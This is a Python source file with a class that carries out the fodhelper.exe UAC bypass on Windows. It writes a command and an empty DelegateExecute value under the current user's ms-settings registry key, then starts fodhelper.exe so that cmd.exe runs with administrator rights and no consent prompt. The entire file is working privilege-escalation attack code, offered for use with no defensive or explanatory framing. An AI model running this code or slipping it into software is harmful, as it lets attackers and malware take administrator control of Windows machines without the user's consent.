import os
import sys
import ctypes
import winreg 


class AdminPrevillage():
    def __init__(self) :
        self.CMD                   = r"C:\Windows\System32\cmd.exe"
        self.FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
        self.PYTHON_CMD            = ""
        self.REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
        self.DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

    def is_running_as_admin(self,):
        '''
        Checks if the script is running with administrative privileges.
        Returns True if is running as admin, False otherwise.
        '''    
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def create_reg_key(self,key, value):
        '''
        Creates a reg key
        '''
        try:        
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, winreg.KEY_WRITE)                
            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
            winreg.CloseKey(registry_key)
        except WindowsError:        
            raise

    def bypass_uac(self,cmd):
        '''
        Tries to bypass the UAC
        '''
        try:
            self.create_reg_key(self.DELEGATE_EXEC_REG_KEY, '')
            self.create_reg_key(None, cmd)    
        except WindowsError:
            raise

    def execute(self,parameter = ''):        
        if not self.is_running_as_admin():
            print ('[!] The script is NOT running with administrative privileges')
            print ('[+] Trying to bypass the UAC')
            try:                
                cmd = '{} /k {} {}'.format(self.CMD, self.PYTHON_CMD, parameter)
                self.bypass_uac(cmd)                
                os.system(self.FOD_HELPER)                
                sys.exit(0)                
            except WindowsError:
                sys.exit(1)
        else:
            print('The script is running with administrative privileges')